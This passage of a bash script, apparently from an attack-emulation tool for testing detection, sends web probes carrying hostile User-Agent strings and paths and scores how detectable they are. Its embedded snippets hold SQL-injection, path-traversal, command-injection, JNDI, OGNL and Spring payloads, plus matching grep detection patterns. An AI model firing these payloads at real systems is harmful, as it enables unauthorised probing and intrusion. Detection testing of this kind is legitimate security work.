        return 0
    fi
    if printf '%s' "${ua}" | grep -qE '12345\\"\\"\\"\};|@@@@@@@|%%%%%%%|<<<<>>>>'; then
        printf 'payload_other'
        return 0
    fi
    if printf '%s' "${ua}" | grep -qiE 'TelemetryCollector|ReconEngine|ThreatHunter|DiscoveryProbe|SecurityAssessment|AuditScanner|EnumerationFramework|AssetProfiler|NetworkSurvey|VulnerabilitySweep'; then
        printf 'rare'
        return 0
    fi
    printf 'payload_other'
}

http_ua_has_attack_pattern_local() {
    local ua="$1"
    http_ua_is_normal_local "${ua}" && return 1
    if printf '%s' "${ua}" | grep -qiE 'OR 1=1|pg_sleep|waitfor delay|convert\(int|'\''='\''|2\+701'; then
        return 0
    fi
    if printf '%s' "${ua}" | grep -qE '%00|%0d|%0a|%2f|%252e|\.\./|/etc/passwd'; then
        return 0
    fi
    if printf '%s' "${ua}" | grep -qE ';id|;whoami|&&hostname|\|cat '; then
        return 0
    fi
    return 1
}

http_ua_apply_classification_counts() {
    local kind="$1"
    case "${kind}" in
        normal) NORMAL_USER_AGENT_COUNT=$((NORMAL_USER_AGENT_COUNT + 1)) ;;
        rare)
            RARE_USER_AGENT_COUNT=$((RARE_USER_AGENT_COUNT + 1))
            ABNORMAL_USER_AGENT_COUNT=$((ABNORMAL_USER_AGENT_COUNT + 1))
            ;;
        payload_sqli)
            PAYLOAD_USER_AGENT_COUNT=$((PAYLOAD_USER_AGENT_COUNT + 1))
            UA_SQLI_STYLE_COUNT=$((UA_SQLI_STYLE_COUNT + 1))
            ABNORMAL_USER_AGENT_COUNT=$((ABNORMAL_USER_AGENT_COUNT + 1))
            ;;
        payload_enc)
            PAYLOAD_USER_AGENT_COUNT=$((PAYLOAD_USER_AGENT_COUNT + 1))
            UA_ENCODING_ABUSE_COUNT=$((UA_ENCODING_ABUSE_COUNT + 1))
            ABNORMAL_USER_AGENT_COUNT=$((ABNORMAL_USER_AGENT_COUNT + 1))
            ;;
        payload_cmd)
            PAYLOAD_USER_AGENT_COUNT=$((PAYLOAD_USER_AGENT_COUNT + 1))
            UA_COMMAND_STYLE_COUNT=$((UA_COMMAND_STYLE_COUNT + 1))
            ABNORMAL_USER_AGENT_COUNT=$((ABNORMAL_USER_AGENT_COUNT + 1))
            ;;
        payload_other)
            PAYLOAD_USER_AGENT_COUNT=$((PAYLOAD_USER_AGENT_COUNT + 1))
            ABNORMAL_USER_AGENT_COUNT=$((ABNORMAL_USER_AGENT_COUNT + 1))
            ;;
    esac
}

http_url_classify_local() {
    local url="$1"
    case "${url}" in
        /|/favicon.ico) printf 'normal'; return 0 ;;
    esac
    if printf '%s' "${url}" | grep -qiE 'WEB-INF/web\.xml|\.\./\.\./etc/passwd|cmd\.jsp|backdoor\.jsp|/admin|swagger|graphql|etc/passwd'; then
        printf 'payload_url'
        return 0
    fi
    printf 'payload_url'
}

http_ua_kind_for_attack_local() {
    local ua="$1"
    if http_ua_is_normal_local "${ua}"; then
        printf 'normal'
        return 0
    fi
    if printf '%s' "${ua}" | grep -qiE 'TelemetryCollector|ReconEngine|ThreatHunter|DiscoveryProbe|SecurityAssessment|AuditScanner|EnumerationFramework|AssetProfiler|NetworkSurvey|VulnerabilitySweep'; then
        printf 'rare'
        return 0
    fi
    printf 'payload'
}

reset_http_attack_metrics() {
    HTTP_ATTACK_TOTAL_REQUESTS=0
    HTTP_ATTACK_PAYLOAD_URL_REQUESTS=0
    HTTP_ATTACK_PAYLOAD_UA_REQUESTS=0
    HTTP_ATTACK_PAYLOAD_URL_WITH_PAYLOAD_UA=0
    HTTP_ATTACK_PAYLOAD_URL_WITH_NORMAL_UA=0
    HTTP_UA_COVERAGE_TOTAL=0
    HTTP_UA_COVERAGE_PRESENT=0
    HTTP_UA_COVERAGE_MISSING=0
    HTTP_UA_COVERAGE_PERCENT=0
    HTTP_UA_COVERAGE_NORMAL=0
    HTTP_UA_COVERAGE_RARE=0
    HTTP_UA_COVERAGE_PAYLOAD=0
    HTTP_UA_COVERAGE_ABNORMAL=0
    HTTP_UA_COVERAGE_REALTIME_TOTAL=0
    HTTP_UA_STAGE_COVERAGE_TOTAL=0
    HTTP_UA_STAGE_COVERAGE_PRESENT=0
    HTTP_UA_STAGE_COVERAGE_MISSING=0
    HTTP_UA_STAGE_COVERAGE_PERCENT=0
    HTTP_UA_STAGE_COVERAGE_NORMAL=0
    HTTP_UA_STAGE_COVERAGE_RARE=0
    HTTP_UA_STAGE_COVERAGE_PAYLOAD=0
    HTTP_UA_STAGE_COVERAGE_ABNORMAL=0
    DETECTION_LIKELIHOOD_URL_SCAN="${HTTP_URL_SCAN_DETECTION_LIKELIHOOD:-low}"
    DETECTION_LIKELIHOOD_MALICIOUS_UA="low"
}

log_http_ua_policy_local() {
    local scope="${1:-url_scan}" msg
    msg="HTTP_UA_POLICY scope=${scope} normal_ua_allowed=no ua_required=yes rare_ratio=50 payload_ratio=50"
    state_append "http_attack_summary.log" "${msg}"
    log_message "OK" "${msg}" >&2
}

merge_http_ua_coverage_line() {
    local line="$1"
    local ct cp cm cn cr cpl cab cpct det
    ct=$(safe_int "$(sed -n 's/.*total_requests=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
    [[ "${ct}" -eq 0 ]] && ct=$(safe_int "$(sed -n 's/.*total_http=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
    cp=$(safe_int "$(sed -n 's/.*ua_present=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
    cm=$(safe_int "$(sed -n 's/.*ua_missing=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
    cn=$(safe_int "$(sed -n 's/.*normal_ua=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
    cr=$(safe_int "$(sed -n 's/.*rare_ua=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
    cpl=$(safe_int "$(sed -n 's/.*payload_ua=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
    cab=$(safe_int "$(sed -n 's/.*abnormal_ua=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
    cpct=$(safe_int "$(sed -n 's/.*coverage_percent=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
    det=$(sed -n 's/.*detection_likelihood_malicious_ua=\([a-z]*\).*/\1/p' <<< "${line}")
    [[ -z "${det}" ]] && det=$(sed -n 's/.*detection_likelihood=\([a-z]*\).*/\1/p' <<< "${line}")
    HTTP_UA_COVERAGE_TOTAL=$((HTTP_UA_COVERAGE_TOTAL + ct))
    HTTP_UA_COVERAGE_PRESENT=$((HTTP_UA_COVERAGE_PRESENT + cp))
    HTTP_UA_COVERAGE_MISSING=$((HTTP_UA_COVERAGE_MISSING + cm))
    HTTP_UA_COVERAGE_NORMAL=$((HTTP_UA_COVERAGE_NORMAL + cn))
    HTTP_UA_COVERAGE_RARE=$((HTTP_UA_COVERAGE_RARE + cr))
    HTTP_UA_COVERAGE_PAYLOAD=$((HTTP_UA_COVERAGE_PAYLOAD + cpl))
    HTTP_UA_COVERAGE_ABNORMAL=$((HTTP_UA_COVERAGE_ABNORMAL + cab))
    if (( HTTP_UA_COVERAGE_TOTAL > 0 )); then
        HTTP_UA_COVERAGE_PERCENT=$((HTTP_UA_COVERAGE_PRESENT * 100 / HTTP_UA_COVERAGE_TOTAL))
    fi
    (( cpct > 0 )) && HTTP_UA_COVERAGE_PERCENT="${cpct}"
    [[ "${det}" == high ]] && DETECTION_LIKELIHOOD_MALICIOUS_UA="high"
    HTTP_UA_COVERAGE_REALTIME_TOTAL="${HTTP_UA_COVERAGE_TOTAL}"
    http_ua_stage_aggregator_commit
}

ingest_http_url_scan_results_from_output() {
    local out="$1" host="$2" scheme="${3:-http}" port="${4:-80}" line=""
    local path="" http_status="" curl_exit="" http_ev_status="response" full_url="" stage="" n_before=0 n_after=0
    [[ -z "${out}" ]] && return 1
    event_store_paths_refresh
    stage="${HTTP_URL_SCAN_RUN_ID:-main}"
    read -r host port scheme <<< "$(normalize_http_scan_target_fields "${host}" "${port}" "${scheme}")"
    n_before=$(event_store_row_count "${EVENT_HTTP_EVENTS}")
    ingest_remote_events "${out}" "HTTP_URL_SCAN" || true
    n_after=$(event_store_row_count "${EVENT_HTTP_EVENTS}")
    (( n_after > n_before )) && return 0
    while IFS= read -r line || [[ -n "${line}" ]]; do
        line=$(printf '%s' "${line}" | tr -d '\r')
        case "${line}" in
            URL_SCAN_RESULT\ *)
                path=$(event_parse_kv_from_line "${line}" url)
                http_status=$(event_parse_kv_from_line "${line}" http_status)
                curl_exit=$(event_parse_kv_from_line "${line}" curl_exit_code)
                [[ -z "${curl_exit}" ]] && curl_exit=$(event_parse_kv_from_line "${line}" curl_exit)
                [[ -z "${path}" ]] && continue
                case "${path}" in
                    http://*|https://*) full_url="${path}" ;;
                    /*) full_url="$(build_web_target_url "${scheme}" "${host}" "${port}" "${path}")" ;;
                    *) full_url="$(build_web_target_url "${scheme}" "${host}" "${port}" "/${path}")" ;;
                esac
                http_ev_status="response"
                [[ -z "${http_status}" || "${http_status}" == "000" ]] && http_ev_status="timeout"
                case "${curl_exit}" in
                    6) http_ev_status="dns_failure" ;;
                    7) http_ev_status="connection_refused" ;;
                esac
                record_http_event "${stage}" "${host}" "${full_url}" "GET" "${http_status:-000}" "${curl_exit:-0}" "${http_ev_status}" "remote_url_scan_result"
                ;;
        esac
    done <<< "$(printf '%s\n' "${out}")"
    n_after=$(event_store_row_count "${EVENT_HTTP_EVENTS}")
    (( n_after > n_before ))
}

ingest_http_attack_remote_output() {
    local out="$1" host="$2" line scheme="${3:-${HTTP_URL_SCAN_SCHEME:-http}}" port="${4:-${HTTP_URL_SCAN_PORT:-80}}"
    [[ -z "${out}" ]] && return 0
    ingest_http_url_scan_results_from_output "${out}" "${host}" "${scheme}" "${port}" || true
    while IFS= read -r line; do
        [[ -z "${line}" ]] && continue
        case "${line}" in
            HTTP_UA_POLICY\ *)
                state_append "http_attack_summary.log" "${line}"
                log_message "OK" "${line}" >&2
                ;;
            HTTP_ATTACK_REQUEST\ *)
                state_append "http_attack_requests.log" "${line}"
                ;;
            URL_SCAN_ATTEMPT\ *)
                state_append "http_url_scan_attempts.log" "${line}"
                log_message "OK" "${line}" >&2
                ;;
            HTTP_UA_COVERAGE\ *)
                merge_http_ua_coverage_line "${line}"
                state_append "http_attack_summary.log" "host=${host} ${line}"
                log_message "OK" "${line}" >&2
                ;;
        esac
    done <<< "$(printf '%s\n' "${out}" | tr -d '\r')"
    http_refresh_sot_from_events || true
}

compute_http_malicious_ua_detection_likelihood() {
    local attack_ua=$((HTTP_UA_COVERAGE_RARE + HTTP_UA_COVERAGE_PAYLOAD))
    if (( HTTP_UA_COVERAGE_TOTAL >= 40 \
        && HTTP_UA_COVERAGE_PRESENT == HTTP_UA_COVERAGE_TOTAL \
        && HTTP_UA_COVERAGE_NORMAL == 0 \
        && HTTP_UA_COVERAGE_ABNORMAL >= 40 \
        && attack_ua >= 40 )); then
        DETECTION_LIKELIHOOD_MALICIOUS_UA="high"
        return 0
    fi
    if (( HTTP_UA_COVERAGE_TOTAL >= 20 && HTTP_UA_COVERAGE_ABNORMAL >= 20 )); then
        DETECTION_LIKELIHOOD_MALICIOUS_UA="medium"
        return 0
    fi
    DETECTION_LIKELIHOOD_MALICIOUS_UA="low"
}

compute_http_ua_detection_likelihoods() {
    DETECTION_LIKELIHOOD_URL_SCAN="${HTTP_URL_SCAN_DETECTION_LIKELIHOOD:-low}"
    compute_http_malicious_ua_detection_likelihood
}

log_http_ua_coverage_aggregate() {
    local det="${DETECTION_LIKELIHOOD_MALICIOUS_UA:-low}" url_det="${DETECTION_LIKELIHOOD_URL_SCAN:-low}" msg="" realtime=0 final=0
    compute_http_malicious_ua_detection_likelihood
    det="${DETECTION_LIKELIHOOD_MALICIOUS_UA}"
    if (( HTTP_UA_COVERAGE_TOTAL < 1 )) && (( HTTP_REQUESTS_ATTEMPTED > 0 )); then
        HTTP_UA_COVERAGE_TOTAL="${HTTP_REQUESTS_ATTEMPTED}"
        HTTP_UA_COVERAGE_PRESENT="${HTTP_REQUESTS_ATTEMPTED}"
        HTTP_UA_COVERAGE_MISSING=0
        HTTP_UA_COVERAGE_ABNORMAL="${ABNORMAL_USER_AGENT_COUNT:-${HTTP_REQUESTS_ATTEMPTED}}"
        HTTP_UA_COVERAGE_RARE="${RARE_USER_AGENT_COUNT:-0}"
        HTTP_UA_COVERAGE_PAYLOAD="${PAYLOAD_USER_AGENT_COUNT:-0}"
        HTTP_UA_COVERAGE_NORMAL="${NORMAL_USER_AGENT_COUNT:-0}"
        HTTP_UA_COVERAGE_PERCENT=100
    fi
    http_ua_stage_aggregator_commit
    realtime="${HTTP_REQUESTS_ATTEMPTED:-0}"
    final="${HTTP_URL_SCAN_SUMMARY_TOTAL:-${HTTP_REQUESTS_ATTEMPTED:-0}}"
    (( final < 1 && HTTP_UA_STAGE_COVERAGE_TOTAL > 0 )) && final="${HTTP_UA_STAGE_COVERAGE_TOTAL}"
    poc_log_summary_consistency_check "http_url_scan" "${realtime}" "${final}"
    (( HTTP_UA_STAGE_COVERAGE_TOTAL < 1 )) && return 0
    msg="HTTP_UA_COVERAGE scope=url_scan total_requests=${HTTP_UA_STAGE_COVERAGE_TOTAL} ua_present=${HTTP_UA_STAGE_COVERAGE_PRESENT} ua_missing=${HTTP_UA_STAGE_COVERAGE_MISSING} normal_ua=${HTTP_UA_STAGE_COVERAGE_NORMAL} rare_ua=${HTTP_UA_STAGE_COVERAGE_RARE} payload_ua=${HTTP_UA_STAGE_COVERAGE_PAYLOAD} abnormal_ua=${HTTP_UA_STAGE_COVERAGE_ABNORMAL} coverage_percent=${HTTP_UA_STAGE_COVERAGE_PERCENT} detection_likelihood=${det} detection_likelihood_malicious_ua=${det} detection_likelihood_url_scan=${url_det}"
    state_append "http_attack_summary.log" "${msg}"
    log_message "OK" "${msg}" >&2
}

check_http_ua_coverage_warn() {
    if (( HTTP_UA_COVERAGE_TOTAL < 1 )); then
        return 0
    fi
    if (( HTTP_UA_COVERAGE_PERCENT < 90 )); then
        log_message "WARN" "HTTP_UA_COVERAGE below 90%: scope=url_scan total_requests=${HTTP_UA_COVERAGE_TOTAL} ua_present=${HTTP_UA_COVERAGE_PRESENT} ua_missing=${HTTP_UA_COVERAGE_MISSING} coverage_percent=${HTTP_UA_COVERAGE_PERCENT}"
        add_fallback_usage "HTTP UA coverage ${HTTP_UA_COVERAGE_PERCENT}% < 90% (missing User-Agent on url_scan requests)"
    fi
    if (( HTTP_UA_COVERAGE_NORMAL > 0 )); then
        log_message "WARN" "HTTP_UA_COVERAGE: normal_ua=${HTTP_UA_COVERAGE_NORMAL} on url_scan scope (policy requires 0)"
        add_fallback_usage "url_scan emitted ${HTTP_UA_COVERAGE_NORMAL} normal browser User-Agent(s)"
    fi
}

format_http_attack_summary_block() {
    cat <<EOF
HTTP UA Policy (url_scan scope — no normal browser UA)
- Policy                         : normal_ua_allowed=no rare_ratio=50% payload_ratio=50% ua_required=yes
- Total requests                 : ${HTTP_UA_COVERAGE_TOTAL:-0}
- UA present / missing           : ${HTTP_UA_COVERAGE_PRESENT:-0} / ${HTTP_UA_COVERAGE_MISSING:-0}
- Coverage percent               : ${HTTP_UA_COVERAGE_PERCENT:-0}%
- normal / rare / payload UA     : ${HTTP_UA_COVERAGE_NORMAL:-0} / ${HTTP_UA_COVERAGE_RARE:-0} / ${HTTP_UA_COVERAGE_PAYLOAD:-0}
- abnormal UA (rare+payload)     : ${HTTP_UA_COVERAGE_ABNORMAL:-0}
- detection_likelihood_url_scan  : ${DETECTION_LIKELIHOOD_URL_SCAN:-low}
- detection_likelihood_malicious_ua : ${DETECTION_LIKELIHOOD_MALICIOUS_UA:-low}
- HIGH malicious UA              : total>=40 ua_present=total normal=0 abnormal>=40 rare+payload>=40
EOF
}

simulate_http_attack_metrics() {
    local planned="$1"
    planned=$(safe_int "${planned}")
    (( planned < 1 )) && planned="${HTTP_SCAN_UNIQUE_URL_TARGET:-50}"
    HTTP_UA_COVERAGE_TOTAL="${planned}"
    HTTP_UA_COVERAGE_PRESENT="${planned}"
    HTTP_UA_COVERAGE_MISSING=0
    HTTP_UA_COVERAGE_NORMAL=0
    HTTP_UA_COVERAGE_RARE=$((planned / 2))
    HTTP_UA_COVERAGE_PAYLOAD=$((planned - HTTP_UA_COVERAGE_RARE))
    HTTP_UA_COVERAGE_ABNORMAL="${planned}"
    HTTP_UA_COVERAGE_PERCENT=100
    DETECTION_LIKELIHOOD_MALICIOUS_UA="high"
    HTTP_ATTACK_TOTAL_REQUESTS="${planned}"
    HTTP_ATTACK_PAYLOAD_URL_REQUESTS="${planned}"
    HTTP_ATTACK_PAYLOAD_UA_REQUESTS="${planned}"
}

http_url_scan_ua_policy_remote_snippet() {
    cat <<'UAPOLICY'
pick_payload_ua(){
if [[ $((RANDOM%2)) -eq 0 ]]; then
    pref=$(pick_rare); payload=$(pick_payload); printf '%s %s' "${pref}" "${payload}"
else
    pick_payload
fi
}
pick_burst_ua(){
if [[ $((RANDOM%2)) -eq 0 ]]; then pick_rare; else pick_payload_ua; fi
}
ensure_ua_nonempty(){
local ua="$1"
[[ -n "${ua}" ]] && { printf '%s' "${ua}"; return; }
pick_burst_ua
}
classify_ua_kind(){
local ua="$1"
if is_normal_ua "${ua}"; then echo normal; return; fi
if echo "${ua}" | grep -qiE 'TelemetryCollector|ReconEngine|ThreatHunter|DiscoveryProbe|SecurityAssessment|AuditScanner|EnumerationFramework|AssetProfiler|NetworkSurvey|VulnerabilitySweep'; then echo rare; return; fi
echo payload
}
log_http_ua_request(){
local path="$1" ua="$2" code="${3:-}" uak uapresent safe_path safe_ua
ua=$(ensure_ua_nonempty "${ua}")
uak=$(classify_ua_kind "${ua}")
uapresent=no
[[ -n "${ua}" ]] && uapresent=yes
ua_cov_total=$((ua_cov_total+1))
if [[ "${uapresent}" == yes ]]; then
    ua_cov_present=$((ua_cov_present+1))
    case "${uak}" in
    normal) ua_cov_normal=$((ua_cov_normal+1));;
    rare) ua_cov_rare=$((ua_cov_rare+1)); ua_cov_abnormal=$((ua_cov_abnormal+1));;
    payload) ua_cov_payload=$((ua_cov_payload+1)); ua_cov_abnormal=$((ua_cov_abnormal+1));;
    esac
else
    ua_cov_missing=$((ua_cov_missing+1))
    ua=$(pick_burst_ua)
    uak=$(classify_ua_kind "${ua}")
    uapresent=yes
    ua_cov_present=$((ua_cov_present+1))
    ua_cov_payload=$((ua_cov_payload+1))
    ua_cov_abnormal=$((ua_cov_abnormal+1))
fi
safe_path=$(printf '%s' "${path}" | tr '\r\n' ' ' | head -c 400)
safe_ua=$(printf '%s' "${ua}" | tr '\r\n' ' ' | head -c 400)
echo "HTTP_ATTACK_REQUEST target=${SCAN_TARGET} path=${safe_path} status_code=${code:-} user_agent=${safe_ua} ua_class=${uak} ua_present=${uapresent}"
}
emit_http_ua_coverage(){
local pct=0 mal=low
(( ua_cov_total > 0 )) && pct=$((ua_cov_present * 100 / ua_cov_total))
if (( ua_cov_total >= 40 && ua_cov_present == ua_cov_total && ua_cov_normal == 0 && ua_cov_abnormal >= 40 && (ua_cov_rare + ua_cov_payload) >= 40 )); then
    mal=high
elif (( ua_cov_total >= 20 && ua_cov_abnormal >= 20 )); then
    mal=medium
fi
echo "HTTP_UA_COVERAGE scope=url_scan total_requests=${ua_cov_total} ua_present=${ua_cov_present} ua_missing=${ua_cov_missing} normal_ua=${ua_cov_normal} rare_ua=${ua_cov_rare} payload_ua=${ua_cov_payload} abnormal_ua=${ua_cov_abnormal} coverage_percent=${pct} detection_likelihood=${mal} detection_likelihood_malicious_ua=${mal}"
}
mandatory_payload_urls=(
'/WEB-INF/web.xml' '/../../etc/passwd' '/cmd.jsp' '/backdoor.jsp' '/admin' '/swagger' '/graphql'
)
mandatory_n=${#mandatory_payload_urls[@]}
payload_recon_urls=(
'/WEB-INF/web.xml' '/WEB-INF/classes/' '/.env' '/backup.zip' '/admin/login' '/actuator/env'
'/cmd.jsp' '/backdoor.jsp' '/swagger' '/swagger-ui.html' '/graphql' '/graphql/console' '/shell.jsp'
'/../../etc/passwd' '/conf/server.xml'
)
payload_recon_n=${#payload_recon_urls[@]}
mandatory_idx=0
payload_idx=0
pick_bad_query_attack(){
case $((RANDOM%8)) in
    0) printf '?file=../../../../WEB-INF/web.xml' ;;
    1) printf '?path=..%%2f..%%2f..%%2fetc%%2fpasswd' ;;
    2) printf '?id=%%00%%00%%00' ;;
    3) printf '?action=../../../../secret/config' ;;
    4) printf '?cmd=|whoami&file=../../../../WEB-INF/classes/' ;;
    5) printf '?%%00=1&page=admin' ;;
    6) printf '?file=%%2e%%2e%%2f%%2e%%2e%%2fweb.xml' ;;
    7) printf '?id=%25%25%25invalid%25%25%25' ;;
esac
}
next_attack_url(){
local base q
if [[ ${mandatory_idx} -lt ${mandatory_n} ]]; then
    base="${mandatory_payload_urls[${mandatory_idx}]}"
    mandatory_idx=$((mandatory_idx+1))
    q=$(pick_bad_query_attack)
    printf '%s%s' "${base}" "${q}"
    return
fi
base="${payload_recon_urls[$((payload_idx % payload_recon_n))]}"
payload_idx=$((payload_idx+1))
q=$(pick_bad_query_attack)
printf '%s%s' "${base}" "${q}"
}
UAPOLICY
}

http_followup_ua_policy_remote_snippet() {
    cat <<'UAFOLLOWUP'
pick_payload_ua(){
if [[ $((RANDOM%2)) -eq 0 ]]; then
    pref=$(pick_rare); payload=$(pick_payload); printf '%s %s' "${pref}" "${payload}"
else
    pick_payload
fi
}
pick_burst_ua(){
if [[ $((RANDOM%2)) -eq 0 ]]; then pick_rare; else pick_payload_ua; fi
}
ensure_ua_nonempty(){
local ua="$1"
[[ -n "${ua}" ]] && { printf '%s' "${ua}"; return; }
pick_burst_ua
}
classify_ua_kind(){
local ua="$1"
if is_normal_ua "${ua}"; then echo normal; return; fi
if echo "${ua}" | grep -qiE 'TelemetryCollector|ReconEngine|ThreatHunter|DiscoveryProbe|SecurityAssessment|AuditScanner|EnumerationFramework|AssetProfiler|NetworkSurvey|VulnerabilitySweep'; then echo rare; return; fi
echo payload
}
log_http_ua_request(){
local path="$1" ua="$2" code="${3:-}" uak uapresent safe_path safe_ua
ua=$(ensure_ua_nonempty "${ua}")
uak=$(classify_ua_kind "${ua}")
uapresent=no
[[ -n "${ua}" ]] && uapresent=yes
ua_cov_total=$((ua_cov_total+1))
if [[ "${uapresent}" == yes ]]; then
    ua_cov_present=$((ua_cov_present+1))
    case "${uak}" in
    normal) ua_cov_normal=$((ua_cov_normal+1));;
    rare) ua_cov_rare=$((ua_cov_rare+1)); ua_cov_abnormal=$((ua_cov_abnormal+1));;
    payload) ua_cov_payload=$((ua_cov_payload+1)); ua_cov_abnormal=$((ua_cov_abnormal+1));;
    esac
else
    ua_cov_missing=$((ua_cov_missing+1))
    ua=$(pick_burst_ua)
    uak=$(classify_ua_kind "${ua}")
    uapresent=yes
    ua_cov_present=$((ua_cov_present+1))
    ua_cov_payload=$((ua_cov_payload+1))
    ua_cov_abnormal=$((ua_cov_abnormal+1))
fi
safe_path=$(printf '%s' "${path}" | tr '\r\n' ' ' | head -c 400)
safe_ua=$(printf '%s' "${ua}" | tr '\r\n' ' ' | head -c 400)
echo "HTTP_ATTACK_REQUEST target=${SCAN_TARGET} path=${safe_path} status_code=${code:-} user_agent=${safe_ua} ua_class=${uak} ua_present=${uapresent}"
}
emit_http_ua_coverage(){
local pct=0 mal=low
(( ua_cov_total > 0 )) && pct=$((ua_cov_present * 100 / ua_cov_total))
if (( ua_cov_total >= 10 && ua_cov_present == ua_cov_total && ua_cov_normal == 0 && ua_cov_abnormal >= 8 )); then
    mal=high
elif (( ua_cov_total >= 5 && ua_cov_abnormal >= 5 )); then
    mal=medium
fi
echo "HTTP_UA_COVERAGE scope=url_scan total_requests=${ua_cov_total} ua_present=${ua_cov_present} ua_missing=${ua_cov_missing} normal_ua=${ua_cov_normal} rare_ua=${ua_cov_rare} payload_ua=${ua_cov_payload} abnormal_ua=${ua_cov_abnormal} coverage_percent=${pct} detection_likelihood=${mal} detection_likelihood_malicious_ua=${mal}"
}
UAFOLLOWUP
}

http_attack_pairing_remote_snippet() {
    http_url_scan_ua_policy_remote_snippet
}

http_ua_remote_bash_snippet() {
    cat <<'UAEOF'
normal_uas='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15'
rare_uas='TelemetryCollector/9.7
ReconEngine/5.4
SecurityAssessmentClient/3.1
ThreatHunterAgent/8.2
InternalAuditScanner/4.0
DiscoveryProbe/7.3
VulnerabilitySweep/2.6
WebEnumerationFramework/11.0
AssetProfiler/6.5
NetworkSurveyBot/3.9
Mozilla/5.0 ReconEngine/5.4
Mozilla/5.0 ThreatHunterAgent/8.2'
pick_sqli(){
case $((RANDOM%9)) in
    0) echo "' OR 1=1--" ;;
    1) echo '" OR 1=1--' ;;
    2) echo "1' OR '1'='1" ;;
    3) echo '1 OR 2+701-701-1=0+0+0+1' ;;
    4) echo '(select convert(int,char(65)))' ;;
    5) echo 'select pg_sleep(3)' ;;
    6) echo 'select pg_sleep(6)' ;;
    7) echo "waitfor delay '0:0:5'" ;;
    8) echo "waitfor delay '0:0:9'" ;;
esac
}
pick_enc(){
case $((RANDOM%6)) in
    0) echo '%00%0d%0a' ;;
    1) echo '%00%0a' ;;
    2) echo '%0d%0a' ;;
    3) echo '../../../../etc/passwd' ;;
    4) echo '..%2f..%2f..%2f' ;;
    5) echo '%252e%252e%252f' ;;
esac
}
pick_cmd(){
case $((RANDOM%4)) in
    0) echo ';id' ;;
    1) echo ';whoami' ;;
    2) echo '&&hostname' ;;
    3) echo '|cat /etc/passwd' ;;
esac
}
pick_corrupt(){
case $((RANDOM%4)) in
    0) echo '12345\"\"\"};]*' ;;
    1) echo '@@@@@@@' ;;
    2) echo '%%%%%%%' ;;
    3) echo '<<<<>>>>' ;;
esac
}
pick_jndi(){
case $((RANDOM%3)) in
    0) echo '${jndi:ldap://127.0.0.1/a}' ;;
    1) echo '${jndi:rmi://127.0.0.1/exploit}' ;;
    2) echo '${jndi:dns://127.0.0.1/x}' ;;
esac
}
pick_ognl(){
case $((RANDOM%2)) in
    0) echo '%{#context[com.opensymphony.xwork2]' ;;
    1) echo '@java.lang.Runtime@getRuntime()' ;;
esac
}
pick_spring(){
case $((RANDOM%2)) in
    0) echo 'spring.cloud.function.routing-expression' ;;
    1) echo 'T(org.springframework.web.server)' ;;
esac
}
pick_payload(){
case $((RANDOM%8)) in
    0) pick_sqli ;;
    1) pick_enc ;;
    2) pick_cmd ;;
    3) pick_corrupt ;;
    4) pick_jndi ;;
    5) pick_ognl ;;
    6) pick_spring ;;
    7) pick_enc ;;
esac
}
pick_rare(){ echo "$rare_uas" | sed -n "$((1+RANDOM%12))p"; }
pick_normal(){ echo "$normal_uas" | sed -n "$((1+RANDOM%2))p"; }
pick_ua(){
local roll=$((RANDOM%100)) pref payload
if [[ $roll -lt 10 ]]; then pick_normal; return; fi
if [[ $roll -lt 50 ]]; then pick_rare; return; fi
if [[ $((RANDOM%2)) -eq 0 ]]; then
    pref=$(pick_rare); payload=$(pick_payload); echo "${pref} ${payload}"
else
    pick_payload
fi
}
is_normal_ua(){ echo "$normal_uas" | grep -Fq "$1"; }
track_ua(){
local ua="$1"
if is_normal_ua "$ua"; then nu=$((nu+1)); return; fi
au=$((au+1))
if echo "$ua" | grep -qiE 'OR 1=1|pg_sleep|waitfor delay|convert\(int|'\''='\''|2\+701'; then
    pu=$((pu+1)); sq=$((sq+1)); return
fi
if echo "$ua" | grep -qE '%00|%0d|%0a|%2f|%252e|\.\./|/etc/passwd|%%%%|@@@@|<<<<'; then
    pu=$((pu+1)); enc=$((enc+1)); return
fi
if echo "$ua" | grep -qE '\.\./|\.\.%2f|/etc/passwd'; then
    pu=$((pu+1)); trav=$((trav+1)); return
fi
if echo "$ua" | grep -qE ';id|;whoami|&&hostname|\|cat '; then
    pu=$((pu+1)); cmd=$((cmd+1)); return
fi
if echo "$ua" | grep -qiE 'jndi:ldap|jndi:rmi|jndi:dns|\$\{jndi:'; then
    pu=$((pu+1)); jndi=$((jndi+1)); return
fi
if echo "$ua" | grep -qiE 'ognl|opensymphony|Runtime@getRuntime'; then
    pu=$((pu+1)); ognl=$((ognl+1)); return
fi
if echo "$ua" | grep -qiE 'spring\.cloud|org\.springframework'; then
    pu=$((pu+1)); spring=$((spring+1)); return
fi
if echo "$ua" | grep -qE '12345\\"\\"\\"\};|@@@@@@@|%%%%%%%|<<<<>>>>'; then
    pu=$((pu+1)); return
fi
if echo "$ua" | grep -qiE 'TelemetryCollector|ReconEngine|ThreatHunter|DiscoveryProbe|SecurityAssessment|AuditScanner|EnumerationFramework|AssetProfiler|NetworkSurvey|VulnerabilitySweep'; then
    ru=$((ru+1)); return
fi
pu=$((pu+1))
}
UAEOF
}

print_http_ua_dry_run_sample_line() {
    local idx="$1" ua="$2"
    log_message "OK" "  UA sample ${idx}: ${ua}"
    state_append "http_ua_dry_run_samples.log" "sample=${idx} kind=$(http_ua_classify_local "${ua}") ua=${ua}"
}

print_http_ua_dry_run_samples() {
    [[ "${DRY_RUN}" != true ]] && return 0
    [[ -n "${HTTP_UA_DRY_RUN_SAMPLES_DONE:-}" ]] && return 0
    HTTP_UA_DRY_RUN_SAMPLES_DONE=1
    local i ua attack_hits=0 pref
    log_message "OK" "HTTP User-Agent dry-run samples (20 — 10% normal / 40% rare / 50% payload):"
    i=1
